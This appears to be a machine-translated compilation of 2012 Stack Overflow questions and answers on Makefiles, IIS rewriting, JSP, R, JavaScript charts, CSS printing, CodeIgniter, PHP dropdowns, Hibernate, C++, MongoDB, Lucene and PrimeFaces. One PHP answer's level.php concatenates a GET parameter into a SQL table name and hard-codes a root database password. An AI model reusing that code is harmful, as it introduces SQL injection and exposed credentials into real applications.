我有一个带有名为 DEBUG 的命令行设置的 Makefile。我希望在执行“make DEBUG=no”后调用“make DEBUG=yes”时重建某些目标文件（以包含调试信息）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:33:43.217

如果文件不存在或具有不同的值，则将该变量的值写入文件。使您的所有目标文件都依赖于该文件，以便每当文件更改时，所有目标文件都会重新编译。例如：

```
BUILD := debug
SHELL := /bin/bash
$(shell [[ `cat .build 2>/dev/null` == ${BUILD} ]] || echo ${BUILD} > .build)

all : prog

prog : .build
    touch $@

clean :
    rm prog .build

.PHONY: all clean 
```

示例运行：

```
$ make
touch prog
$ make
make: Nothing to be done for `all'.
$ make BUILD=release
touch prog
$ make BUILD=release
make: Nothing to be done for `all'. 
```

更好的方法是像 MSVS 那样将调试和发布版本构建到不同的目录中，但这需要更高级的 makefile。

# php - 页面的友好子文件夹链接（维基百科风格）

> ID：12192836
> 
> 赞同：0
> 
> 时间：2012-08-30T08:29:34.020
> 
> 标签：php, sql-server-2005, iis-6

我很难找到这个，因为我不确定我在寻找什么！

我看到一些网站似乎使用“子文件夹”作为页面链接，例如维基百科。

例如，假设我在数据库中有一条具有唯一标题“我的购物清单”的记录。我希望能够导航到**www.mySite.com/my_shopping_list**并让它自动“转发”到显示相关记录的页面。

我正在使用 IIS，想知道是否有办法可以做到这一点，但我可能找错了地方。

这是一个知识库，我可能会在其中写一篇名为“如何使用计算机”的文章，并希望能够为用户创建一个“友好”链接（**http://www.mySite.com/how_to_use_a_computer**而不是**http: //www.mySite.com/article.php?ID=123** . 我需要能够使用标题字段动态创建这些“链接”。

谢谢

编辑：我正在使用 IIS6

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:36:19.547

你应该使用 URL Rewrite，这个技术的微软资源在这里：[http ://www.iis.net/download/urlrewrite](http://www.iis.net/download/urlrewrite)

在[iss 论坛](http://forums.iis.net/t/1160436.aspx)中，讨论了有关在 iss < 7 中重写 url 的问题，并提供了一些软件使用建议。

我不知道哪个最好，也许还有其他人知道：

[http://iirf.codeplex.com/](http://iirf.codeplex.com/)

[http://www.isapirewrite.com/](http://www.isapirewrite.com/)

[http://urlrewriter.net/](http://urlrewriter.net/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:40:06.690

使用 PHP，您需要使用 htaccess 文件或管理器 GUI 之类的东西对 URLConf 进行编码。您可以阅读[有关 URL 重写的 ISS 文档以了解如何操作。](http://learn.iis.net/page.aspx/461/creating-rewrite-rules-for-the-url-rewrite-module/)，但据我了解，这是一个您必须单独下载的模块。

[这个问题](https://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php)还展示了如何在不编辑服务器配置文件或 htaccess 的情况下做到这一点，但你会被一种`http://example.com/index.php/path/to/view`格式困住（其中`index.php`包含 URLConf 的真实脚本在哪里。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:41:56.843

好吧，前段时间它被用来调用'Friendly URL'或'FURL'，现在我看到它是ust Rewrite URL。寻找适合初学者的教程。

# java - 在包含jsp之前设置属性

> ID：12192837
> 
> 赞同：0
> 
> 时间：2012-08-30T08:29:34.287
> 
> 标签：java, jsp, include, setattribute, usebean

考虑这种情况：

```
<!-- main.jsp -->
<% for (int i = 0; i < 10; i++) { %>
    <% request.setAttribute("i", new Integer(i)); %>
    <jsp:include page="template.jsp" />
    <% request.removeAttribute("i"); %>
<% } %>

<!-- template.jsp -->
<jsp:useBean id="i" scope="request" type="java.lang.Integer" />
<%=i%> 
```

如果我执行`main.jsp`，我会得到这个结果：

```
0 1 2 3 4 5 6 7 8 9 
```

这就是我想要的。

但问题是：

显示顺序会一直这样吗？我应该为请求同步吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:33:28.053

**是**的 显示顺序将始终相同，

您正在将其用于请求每个请求的新实例，因此无需同步

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T09:10:14.707

`synchronization`在开发 Java EE 应用程序时几乎总是不需要。因此，如果您有疑问，请不要使用它。

# r - 在 R 中通过 SpatialPolygons 覆盖 SpatialLines

> ID：12192838
> 
> 赞同：2
> 
> 时间：2012-08-30T08:29:42.603
> 
> 标签：r, spatial

我有一个`SpatialLines`代表道路的`SpatialPolygons`对象和一个包含城市的对象。

我想知道如何 用 R 中`SpatialLines`的对象覆盖对象。`SpatialPolygons`

我想知道经过这两个城市的线路以及在哪些城市？

是否可以？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:58:54.467

您需要包含几何操作的 GEOS 库的 rgeos 包。

然后可能 gIntersection 或 gIntersects 会做你想要的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:45:18.570

通常，空间对象的叠加由包中的`over`函数处理`sp`。在`over`( `?over`) 文档的“方法”部分中，有一个 的方法列表`over`，其中不包括 和 的`Lines`组合`Polygons`。幸运的是，文档`over`说通过安装`rgeos`软件包可以使用这些方法。

# javascript - 加载多个谷歌图表需要太长时间

> ID：12192841
> 
> 赞同：1
> 
> 时间：2012-08-30T08:29:49.950
> 
> 标签：javascript, ajax, loading, google-visualization

我有一个带有这样的 javascript 的 HTML 文件：

```
function drawCharts(){
  var graph; var data; var options;
  options = { title: 'Title1' };
  data = google.visualization.arrayToDataTable([['A','B'],['0',7.2],['2',7.2],['4',7.3],['6',6.4],['8',6.4],['10',6.3],['12',6.2],['14',6.2],['16',6],['18',6],['20',6.5],['22',7.2]]);
  graph = new google.visualization.LineChart(document.getElementById('chart_div1'));
  graph.draw(data, options);
  ...
  data = google.visualization.arrayToDataTable([['A','B'],['0',14.5],['2',14.5],['4',14.5],['6',13.2],['8',13.1],['10',12.9],['12',12.8],['14',12.7],['16',12.5],['18',12.4],['20',12.2],['22',14.5]]);
  graph = new google.visualization.LineChart(document.getElementById('chart_div50'));
  graph.draw(data, options);
}
google.setOnLoadCallback(drawCharts); 
```

（这个文件是以前生成的。）问题是，当加载 50 个图表时，需要相当长的时间。最好是独立绘制图表，而不是等待其他人绘制 - 我想问你它是如何制作的。

编辑：受PhonicUK 回答的启发，我发现了一个[Element 'in view' 插件](http://remysharp.com/2009/01/26/element-in-view-event-plugin/)，当正在查看某个div 并且它是空的时，我正在使用它调用一个函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:38:58.190

你可以在这里做一些不同的事情：

首先是有 50 个图表，我假设并非所有图表都同时可见。因此，您可以捕获 window.onscroll 事件以了解用户何时滚动，并且仅在图形位于可见区域底部下方时才创建图形。这意味着只创建当前可见和即将可见的图形，其余的在需要时才存在。

第二个是生成图形服务器端并将它们作为图像发送。这也可以与上述结合以节省加载时间。

# javascript - javascript 引擎（如 Spidermonkey）何时会构建在 jquery、mootools 等库中？谁能帮助实现这一点？

> ID：12192844
> 
> 赞同：0
> 
> 时间：2012-08-30T08:29:55.153
> 
> 标签：javascript, spidermonkey, javascript-engine

我们都知道**jquery 和 mootools 等 js 库**对 Web 浏览器和 Web 开发的巨大好处。这些库现在包含在很多网站中，如果不是大多数网站的话。

所以，我想知道为什么当前的**javascript 引擎都没有在 javascript 引擎本身中包含这些功能**。毫无疑问，这具有更多好处，例如性能、无需外部加载、标准化（及其自身的好处）等。

我意识到这可能只会使网络浏览器等受益，尽管除了网络浏览器之外还必须有许多用途，但为了争论，人们可以在可选引擎/ECMASCript 中添加这种内置功能的引擎 - 我我在这里猜这个词-组件（强调可选），然后只能在网络浏览器内的引擎中启用或添加。

有谁知道这一点或有更多关于这一切的信息？

我的第二个问题是：如果我们，社区，决定这是未来的一个巨大进步，**我们可以在哪里提出/提出这样的事情**，我们还能做些什么来实现这一点？

（你们中的一些人必须意识到某些项目中包含某些功能成本的麻烦，例如由无数用户投票选出的几年到十年前的功能请求，但由于......好吧......让我们不要忘恩负义开发人员并将这些点留给你自己的想象。所以我宁愿让社区把这个愿望集中在一个地方，也许第二个问题的答案就是它的开始？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T20:36:38.377

ECMAScript 只打算标准化构建您所描述的这些更高级别的库所需的最少数量的语言和支持库。此外，像 jQuery 这样的东西可以在浏览器代码提供的文档对象模型上工作，这甚至不是 ECMAScript 标准的一部分——ECMAScript 只知道“外来对象”的一般类别中的 DOM 节点。SpiderMonkey 引擎仅实现 JavaScript 语言及其小型标准库，然后将其嵌入到更大的 Firefox 浏览器环境中。

那么，更直接地回答这个问题：是否有可能让 JavaScript 引擎深入了解 jQuery 之类的用户级库（也可能是实现）？是的，尽管正如您所提到的，您会在浏览器中破坏很多组件化。真的有人会这样做吗？很可能不会，因为 JavaScript 引擎只是实现了构建更高级别库（如 jQuery）所必需的核心。每个人都对他们生活在 JS 引擎之外感到满意，并且 JavaScript 的一个不错的特性是您可以根据需要加载库 - 源代码是免费提供的。

事实上，作为进一步的说明，JS 引擎正在越来越多地将 ECMAScript 标准库代码推出 C++ 实现领域，并进入称为“自托管内置”的东西，这使得功能`Array.indexOf`可以在 JavaScript 本身中实现（即，带有 for 循环和比较）。这将更多 JavaScript 代码暴露给优化 JIT 编译器的自然过程，而不必专门处理对本机 C++ 实现代码的调用。

# html - 打印 HTML 页面时如何在每个页面中显示页脚

> ID：12192845
> 
> 赞同：3
> 
> 时间：2012-08-30T08:30:03.937
> 
> 标签：html, css

我正在尝试创建一个 html 页面，该页面将用于使用浏览器打印数据。我需要包含一个页脚，它会在打印时显示在底部的每一页中，并且我已经开发了以下代码来实现它。

以下代码工作正常，但问题是当我在 div 中的内容 `content`足够长以使用户向下滚动页面时，如果我转到 Google Chrome 的打印选项并查看打印预览，我可以看到页脚显示在第一页，但不在其余页面中。但是这个相同的代码在 Firefox 中工作，并且页脚显示在所有打印页面中（甚至显示在打印预览中）。

你能帮我在使用谷歌浏览器打印时显示每页的页脚吗？

谢谢 ：）

```
<html>
<head>  

 <style type="text/css">
 html {margin:0;padding:0;border:0; overflow-y: scroll;}
 body { font-size:75%;color:#222; font-family: Geneva, Arial, Helvetica, sans-serif;}
 #container {margin:0 auto; height:100%; }
 #content{}
 #footer {position: fixed ; left: 0px; bottom: 0px; right: 0px; font-size:10px; }
 </style>

 </head>

<body>
 <div id="container">
    <div id="content">
       My Contents
    </div>

   <div id="footer">This is my Footer</div>

 </div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:37:28.747

应该有`position: relative`页脚的父元素，它的父元素是这样的`body`，所以把它给身体或`container`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:43:18.263

[http://jsfiddle.net/jXujq/](http://jsfiddle.net/jXujq/)查看CSS代码...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-23T23:12:24.467

对于仍然面临这个问题的任何人，我创建了一个可以解决它的开源库。它允许从 Chrome 打印重复的页眉和页脚，具体取决于 html 的结构。看到这个答案：

[https://stackoverflow.com/a/34444930/2196424](https://stackoverflow.com/a/34444930/2196424)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-09T02:02:06.390

我在这个页脚的事情上花了很多时间，我可以在 IE 上使用 position: fixed 和 bottom 0 来完成它，并带有一些正文边距以避免内容与页脚重叠。

但是使用chrome，我能够做类似事情的唯一方法是使用javascript来计算将页脚推到底部所需的空白（通过将该值分配给一个空的div）：-

```
var printPageHeight = 1900;  //(have to test this value)
var mFooter = $("#footer");
var bottomPos = mFooter.position().top + mFooter.height();

var remainingGap = (bottomPos <printPageHeight ) ? (printPageHeight -bottomPos) :           printPageHeight - (bottomPos % printPageHeight );

$("#whiteSpaceToPositionFooter").css("height", remainingGap+"px"); 
```

但是，正确获取打印页面的大小/高度非常困难，并且 jquery 的 height() 方法不考虑边距和高度。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-11-15T06:33:36.253

您需要在页脚中设置：

```
position:fixed;
bottom:0; 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-08-30T08:32:32.057

也许这会对你有所帮助？

[CSS 粘滞页脚](http://www.cssstickyfooter.com/)

# automation - 在 MS-Word 中插入日期差异字段

> ID：12192854
> 
> 赞同：1
> 
> 时间：2012-08-30T08:30:37.597
> 
> 标签：automation, ms-word, ms-office, field

我需要在 MS Word 文档中创建的 CV 中插入人们的年龄。

我知道这个人的出生日期。

有没有办法插入一个自动计算年龄的字段？

*   约翰尼·沃克，`{FIELD=NOW-BIRTHDATE}`多年。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T15:55:51.970

这不是 100%，但它可能会：

![单词日期](../Images/742886165b7afced471daabe3fcdfafc.png)

```
{={ DATE \@ "YY" } - { MERGEFIELD DOB \@ "YY" } + 
    {IF { DATE \@ "MM" } - { MERGEFIELD DOB \@ "MM" } 1 0 }} 
```

使用 ctrl+F9 添加 {}，使用 F9 重新计算，使用 alt+F9 显示结果。

# c# - K-MVC 客户端和服务器端验证

> ID：12192860
> 
> 赞同：1
> 
> 时间：2012-08-30T08:30:57.307
> 
> 标签：c#, asp.net-mvc-3, knockout-mvc

我花了 5 天时间解决问题，但找不到问题。我在我的项目中使用[K-MVC](http://knockoutmvc.com/) 提交数据。这是一个简单的例子：1）控制器

```
 public class TechnologyController : KnockoutController
{
     public ActionResult AddTechnology()
    {
        var model=new TechnologyViewModel();
        return View(model);
    }

    [HttpPost]
    public ActionResult AddTechnology(TechnologyViewModel viewModel)
    {
        if(ModelState.IsValid)
        {
            _serviceClient.AddTechnology(viewModel);
            viewModel.SavedSaccessfully = true;
        }
        return Json(viewModel);
    }
} 
```

2) 型号

```
 public class TechnologyViewModel
{
    public int TechnologyId { get; set; }

    [Required]
    public string Name { get; set; }

    public bool IsActual { get; set; }

    public bool SavedSaccessfully { get; set; }
} 
```

3) 剃须刀

```
 @using PerpetuumSoft.Knockout
@model Core.ViewDataModel.TechnologyViewModel

@{
    var ko = Html.CreateKnockoutContext();
    ViewBag.Title = "New technology";
}

@using (ko.If(m => m.SavedSaccessfully))
{
    @ko.Html.Span("NEW TECHNOLOGY SAVED TO DATABASE.")
}

@using (ko.If(m => m.SavedSaccessfully == false))
{
     using (ko.Html.Form("AddTechnology", "Technology", ko.Model))
     {
         <p>@Html.Label("Name: ") @ko.Html.TextBox(m => m.Name).ValueUpdate(KnockoutValueUpdateKind.AfterKeyDown) </p>
         <p>@Html.Label("Active : ")         @ko.Html.CheckBox(m => m.IsActual).ValueUpdate(KnockoutValueUpdateKind.Change) </p>
</p>
         <p>
            <input class="submitButton" type="submit" value="Create" />
         </p>
     }
}
@ko.Apply(Model) 
```

它工作正常。然后在控制器中接收到的无效模型将不会提交。但是，如果模型发回，则什么也不会发生。不会出现验证消息。我试着像标准的 MVC 一样：

```
using (ko.Html.Form("AddTechnology", "Technology", ko.Model))
 {
     Html.EnableClientValidation();

     <p>@Html.Label("Name: ")            @ko.Html.TextBox(m => m.Name, new{name="Name"}).ValueUpdate(KnockoutValueUpdateKind.AfterKeyDown) @Html.ValidationMessageFor(m=>m.Name) </p>
     <p>@Html.Label("Active : ")         @ko.Html.CheckBox(m => m.IsActual).ValueUpdate(KnockoutValueUpdateKind.Change) </p>

     <p>
        <input class="submitButton" type="submit" value="Create" />
     </p>
 } 
```

但它不起作用。请帮忙！求救！---......----......----...... :)

# php - 在 CodeIgniter 中构建多语言导航菜单

> ID：12192864
> 
> 赞同：0
> 
> 时间：2012-08-30T08:31:15.643
> 
> 标签：php, codeigniter

我正在尝试创建一个构建和显示导航菜单的功能，同时尽可能地保持 MVC（虽然我是新手，所以我不完全理解它）。

我的脚本在没有提供错误消息的情况下死亡。让我们调查一下！

在我看来，我调用了一个构建菜单内容的函数，并发送菜单中应该存在的页面名称：

```
// application/views/templates/header.php

<ul class="navigation">
        <?php 
        //  Send in the English name, which also becomes the slug.
        //  Function should return the name in the appropriate language,
        //  plus the slug in English.

        $args = ['home','compete','gallery','finalists','about'];
        build_navigation($args);
        ?>
</ul> 
```

现在的想法是遍历这些参数，并为每个参数构建一个列表项，其中包含文件名（也是 URL slug）和适当语言的显示名称。

```
// application/helpers/navigation_helper.php
// This is loaded in autoload.php — confirmed working

<?php
if ( ! defined('BASEPATH')) exit('No direct script access allowed');

if ( ! function_exists('build_navigation')) {

    function build_navigation($args) {
        foreach ($args as $token)
            echo "<li><a href=\"{$token}\">{$this->lang->line($token)}</a></li>\n";
    }   
}

?> 
```

当我看到它时，我觉得它有点道理，但同时提出了诸如“`$this`给定上下文中的内容是什么？”之类的问题</p>

**如果我更改** `$this->lang->line($token)`为 just `$token`，**脚本就会运行**（尽管我没有获得多语言功能）。

我有我需要的语言文件……</p>

```
// application/language/english/en_lang.php

<?php

$lang['home'] = "Home";
$lang['compete'] = "Compete";
$lang['gallery'] = "Gallery";
$lang['finalists'] = "Finalists";
$lang['about'] = "About";

?>

// application/language/swedish/sv_lang.php

<?php

$lang['home'] = "Hem";
$lang['compete'] = "Tävla";
$lang['gallery'] = "Galleri";
$lang['finalists'] = "Finalister";
$lang['about'] = "Info";

?> 
```

…在这里你可以看到我正在将我的语言文件加载到我的控制器中（这几乎完全反映了 CI 文档中的页面控制器）：

```
<?php

/**
 * Pages
 *
 * Class for building static pages.
 *
 */

class Pages extends CI_Controller {
    public function view ($page = 'home') {

        if (!file_exists('application/views/pages/'.$page.'.php'))
            show_404();

        $data['title'] = ucfirst($page); // Capitalise first letter of title

        $this->lang->load('en','english');
        $this->lang->load('sv','swedish');
        $this->load->view('templates/header', $data);
        $this->load->view('pages/'.$page, $data);
        $this->load->view('templates/footer', $data);

    }
}

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:43:07.817

在你的`build_navigation($args)`

尝试

$ci = &get_instance();

而不是`$this->`使用`$ci->lang`

0,

```
$this->lang->load('filename', 'language'); 
```

其中 filename 是您希望加载的文件的名称（不带文件扩展名），而 language 是包含它的语言集（即英语）。如果缺少第二个参数，将使用 application/config/config.php 文件中设置的默认语言。

您只需要加载所需的语言而不是两者。

# php - 自动填充两个下拉菜单

> ID：12192865
> 
> 赞同：0
> 
> 时间：2012-08-30T08:31:20.137
> 
> 标签：php, drop-down-menu

有两个下拉菜单，A 和 B。

a中的值是： - 汽车，自行车，平面B中的值是（选择汽车时）： - 选择自行车时的梅赛德斯： - 杜卡迪： - 选择平面时： - mig，concorde

同样在选择两个下拉菜单中的值后，将更新一个带有价格的文本框，我需要这是一个重复的过程。我该如何实施？我对 PHP 相当陌生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T11:50:52.067

首先，我要感谢 jogesh_p 的帮助。

我终于设法自动填充两个下拉菜单，并使第二个下拉菜单依赖于第一个下拉菜单。

正如 jogesh 在[使用 php 和 jQuery 的动态选择框上提到的他的博客](http://blog.webtech11.com/2012/03/04/dynamic-select-box-with-php-and-jquery.html)

确实有很大帮助。

但是，我将发布我使用过的代码，因为论坛往往会占据 Google 中更高的结果，并且让像我这样的其他新 php 程序员更容易找到它。

编码分两页完成：

1.  `attempt.php`（这是主页）
2.  `level.php`（当第一个下拉菜单的值改变时调用这个页面）

jQuery 和 PHP 都用过。

`attempt.php`：

```
<?php
//connect to the database
$con = mysql_connect("localhost","root","12345") or die("error ".mysql_error());

//connect to the trav table
mysql_select_db("trav",$con) or die("error ".mysql_error());
?>

<html>
<head>    
   <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
   <script>
   $(function()
   {

        $(window).load(function()
        {
            $('#building').change(function()
            {
                var parentValue = $(this).val();

                // Determine the selected Value
                if( parentValue.length != "" )
                {
                    $.ajax(
                    {
                        url: 'level.php',
                        data: {parent: parentValue},
                        success: function(data)
                        {
                            $('#level').html(data);
                        }
                    });
                }
                else
                {
                    $('#level').html('<option value="">Please Select</option>');
                }
            });
        });
    });
    </script>
</head>

<body>
<form method="post" action="<?php echo $PHP_SELF;?>">

    <table cellpadding="6" cellspacing="1">
        <tr>
            <td>
                <label>Select Building : </label>
            </td>
            <td>
                <select id="building">
                    <option value="">Please Select</option>
                    <?php
                        $query = "select * from build_list";
                        $result = mysql_query($query) or die('Error'.mysql_error());

                        while( $row = mysql_fetch_assoc($result) )
                        {
                            echo '<option value="'. $row['building'] .'">' . ucwords($row['building']) . '</option>';
                        }
                    ?>
                </select>
            </td>
            <td>
                <label>Select Level : </label>
            </td>
            <td>
                <select id="level">
                        <option value="">Please Select</option>
                </select>
            </td>
        </tr>   
    </table></center>
</form>
</body>
</html> 
```

`level.php`：

```
<?php
//connect to the database
$con = mysql_connect("localhost","root","12345") or die("error ".mysql_error());

//connect to the trav table
mysql_select_db("trav",$con) or die("error ".mysql_error());

$building = mysql_real_escape_string($_GET['parent']);

$query = "select * from ";
$query = $query . $building;
$query = $query . ";";
$result = mysql_query($query) or die('Error in Child Table!');

echo '<option value="">Please Select</option>';
while( $row = mysql_fetch_assoc($result) )
{
    echo '<option value="'. $row['lvl'] .'">'.$row['lvl'].'</option>';
}
?> 
```

**请注意，上面的代码是从 jogesh 的博客中使用的。上面已经提到了链接。**

希望它可以帮助像我这样对 php 不熟悉但喜欢尝试我们不同的东西的其他 php 程序员。

# hibernate - Hibernate 自定义类型和 JPA2 标准

> ID：12192868
> 
> 赞同：3
> 
> 时间：2012-08-30T08:31:35.333
> 
> 标签：hibernate, jakarta-ee, jpa-2.0, criteria

至于遗留原因，我们将日期存储为 NUMBER 在我们的 oracle 数据库中（例如 1101980 是 1980 年 10 月 1 日）。

我们使用 jboss AS 7.1.2 和 hibernate 作为持久性提供者。为了能够在我的实体中使用 java.util.Date，我创建了一个休眠自定义类型来在 java.util.Date 和数据库中的 NUMBER 之间进行转换。实体的属性相应地用hibernate的注释`@Type`。

到目前为止，这工作得很好。但是现在我们开始使用 JPA 2 的条件 API，并且对于这些查询，自定义类型不会被应用。

例如，我将出生日期设置为 java.util.date：

```
Predicate birthday = cb.equal( person.get( Person_.dateOfBirth ), date ); 
```

但是当我执行查询时，我得到

> ORA-00932: 不一致的数据类型: 预期 NUMBER 得到了 TIMESTAMP

这表示未应用自定义类型。有没有办法解决这个问题？也许通过使用任何休眠的特定标准api？我真的不想`Long`在我的实体中有日期

# c++ - 您对这个 C++ 表达式有什么期望？

> ID：12192870
> 
> 赞同：4
> 
> 时间：2012-08-30T08:31:46.347
> 
> 标签：c++, visual-studio-2008, syntax, ternary-operator

```
 bool bSwitch  = true;
  double dSum = 1 + bSwitch?1:2; 
```

所以“dSum”是：

a)=1
b)=2
c)=3

结果太荒谬了，我为此受到了抨击......

我正在使用 VS2008 ->“Microsoft (R) 32-Bit C/C++-Optimierungscompiler Version 15.00.21022.08 für 80x86”

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-30T08:36:14.477

`operator+`具有比三元运算符更高的[优先级](http://en.cppreference.com/w/cpp/language/operator_precedence)`?:`。

所以，这相当于

```
double dSum = ( 1 + bSwitch ) ? 1 : 2; 
```

因此，您有`dSum == 1`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T08:34:35.783

这是一个优先的事情不是它。

```
bool bSwitch  = true;
double dSum = (1 + bSwitch)?1:2; 
```

`dSum`将是 1.0

在操作员周围有合理的间距会更容易被发现。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-30T08:36:24.540

我会期望`1.`，因为`+`运算符优先于三元运算符。所以表达式被读作

```
double dSum = (1 + bSwitch) ? 1:2; 
```

并且`1 + bSwitch`是非零的，因此它的计算结果为`true`。

请参阅[运算符优先级](http://en.cppreference.com/w/cpp/language/operator_precedence)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T11:08:22.827

显然是一个警告，但我使用的是真正的编译器：

```
void foo() {
  bool bSwitch  = true;
  double dSum = 1 + bSwitch?1:2;
} 
```

给出：

```
$ clang++ -fsyntax-only test.cpp
test.cpp:3:28: warning: operator '?:' has lower precedence than '+'; '+' will be evaluated first [-Wparentheses]
  double dSum = 1 + bSwitch?1:2;
                ~~~~~~~~~~~^
test.cpp:3:28: note: place parentheses around the '+' expression to silence this warning
  double dSum = 1 + bSwitch?1:2;
                           ^
                (          )
test.cpp:3:28: note: place parentheses around the '?:' expression to evaluate it first
  double dSum = 1 + bSwitch?1:2;
                           ^
                    (          )
1 warning generated. 
```

是的，我给出了整个命令行，默认情况下它是**打开的。**

# mongodb - 如何将字段添加到包含其他两个字段比较结果的文档中

> ID：12192877
> 
> 赞同：4
> 
> 时间：2012-08-30T08:32:26.167
> 
> 标签：mongodb

我想加快对我的 mongoDB 的查询，该查询使用 $where 来比较文档中的两个字段，这似乎真的很慢。

我的查询如下所示：

```
db.mycollection.find({ $where : "this.lastCheckDate < this.modificationDate}) 
```

我想做的是在我的文档中添加一个字段，即`isCheckDateLowerThenModDate`，我可以在其上执行一个可能更快的查询：

```
db.mycollection.find({"isCheckDateLowerThenModDate":true}) 
```

我对 mongoDB 很陌生，不知道该怎么做。如果有人能给我一些提示或示例，我将不胜感激

1.  如何在现有集合上初始化这样的字段
2.  如何维护这个领域。这意味着如何在`lastCheckDate`或`modificationDate`更改时更新此字段。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:03:47.440

你的想法是对的！

> 1.如何在现有集合上初始化这样的字段。

最简单的方法是加载每个文档（从您的语言），计算该字段，更新并保存。

或者您可以通过 mongo shell 执行更新：

```
db.mycollection.find().forEach(function(doc) { 
   if(doc.lastCheckDate < doc.modificationDate)
   {
     doc.isCheckDateLowerThenModDate = true;
   }
   else
   {
     doc.isCheckDateLowerThenModDate = false;
   }
   db.mycollection.save(doc); 
}); 
```

> 2.如何维护这个字段。这意味着当 lastCheckDate 或 modifyDate 更改时如何更新此字段。

您必须从您的客户端代码中自己完成。为更新、保存操作和每次重新计算这个值做一些包装。要绝对确定此更新有效 - 编写单元测试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T10:19:55.423

该[`$where`子句](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-JavascriptExpressionsand%7B%7B%24where%7D%7D)很慢，因为它使用 JavaScript 解释器评估每个文档。

有几种选择：

1）假设您的用例是“查找需要更新的记录”，请利用[稀疏索引](http://www.mongodb.org/display/DOCS/Indexes#Indexes-sparse%3Atrue)：

*   每当更新时添加一个布尔字段`needsChecking`，例如[`$set`](http://www.mongodb.org/display/DOCS/Updating#Updating-%24set)`modificationDate`

*   在您的“检查”过程中，找到设置了此字段的文档（由于索引稀疏，应该很快）

    > db.mycollection.find({'needsChecking':true});

*   在您完成所需的任何检查后，[`$unset`](http://www.mongodb.org/display/DOCS/Updating#Updating-%24unset)该`needsChecking`字段。

2) MongoDB 2.2 中一个新的（更快的）特性是[聚合框架](http://docs.mongodb.org/manual/applications/aggregation/)。

下面是一个基于日期比较添加“isUpdated”字段，然后过滤匹配文档的示例：

```
 db.mycollection.aggregate(
            { $project: {
                    _id: 1,
                    name: 1,
                    type: 1,
                    modificationDate: 1,
                    lastCheckDate: 1,
                    isUpdated: { $gt:["$modificationDate","$lastCheckDate"] }
            }},
            { $match : {
                    isUpdated : true,
            }}
    ) 
```

当前使用聚合框架的一些注意事项是：

*   您必须指定要包含的字段`_id`
*   结果仅限于当前最大 BSON 文档大小（MongoDB 2.2 中为 16Mb）

# lucene - Lucene，停用词过滤器

> ID：12192879
> 
> 赞同：1
> 
> 时间：2012-08-30T08:32:31.517
> 
> 标签：lucene, stop-words

嗨，我在使用停用词索引时使用的是 StandardAnalyzer。

当我索引该行时

用于 Macintosh 的 Microsoft Excel

像这样搜索效果很好

我在搜索时使用与索引 +Microsoft +Excel +for +Macintosh 时相同的分析器

当我尝试像这样搜索时

“Microsoft Excel for Macintosh”我没有得到任何结果，因为它被转换为“Microsoft Excel Macintosh”

任何人都知道为什么我的结果是 0 ？

//三连

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T06:14:16.697

StandardQueryParser.setEnablePositionIncrements(true);

成功了。

# java - Primefaces 可调整大小的容器

> ID：12192886
> 
> 赞同：1
> 
> 时间：2012-08-30T08:32:36.050
> 
> 标签：java, jsf, jakarta-ee, jsf-2, primefaces

我在我的应用程序中使用可调整大小的 primefaces。我知道如果我们设置containment=true，container 将是组件的父级。但我希望我的组件包含在下面的祖父母中是代码：

```
 <p:dataTable id="tab" value="#{listOfDays}">
   <p:column>
    <h:outputText value="#{day}"/> //from MON to SUN
   </p:column>
   <p:column>
  <p:outputPanel id="pnl">
  <ui:repeat id="loop" value="somelist">
  <p:commandLink id="link"/>
  <p:resizable for="link" listener="#{calllistener}" containment="true"/>
  </ui:repeat>
  </p:outputPanel>
   </p:column>
   </p:dataTable> 
```

我希望在调整大小时将 commandlink 限制为 outputPanel。当我将包含设置为 true 时，它​​仅限于 ui:repeat，因为它是 commandlink 的壁橱父级。那么，有什么方法可以将命令链接限制为祖父母，即在这种情况下，当调整命令链接的大小时，输出面板？

**编辑** 我可以像这样在支持 bean 中设置组件父级

```
 public void handleResize(ResizeEvent event){
         if(first time) {
         resizable =(Resizable)(event.getComponenet());
          resizable.setParent(event.getParent().getParent());
          }
         sysout(resizable.getClientId()); 
     } 
```

我可以在调整大小时打印父母的客户 ID，但它不包含在祖父母中。任何帮助是极大的赞赏。

**编辑** 让我清楚我想要实现的目标。我正在尝试创建一个时间调度程序（不是主要面孔中的调度程序组件）

在代码中，输出面板有一个图像，表示从 00:00 到 23:59 的时间，输出面板可以有任意数量的命令链接，因此 ui:repeat。commandlink 表示时间间隔，例如从 12:00 到 20:00，我们还可以更改时间间隔，从而调整大小。我不希望时间间隔（命令链接）超出输出面板。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
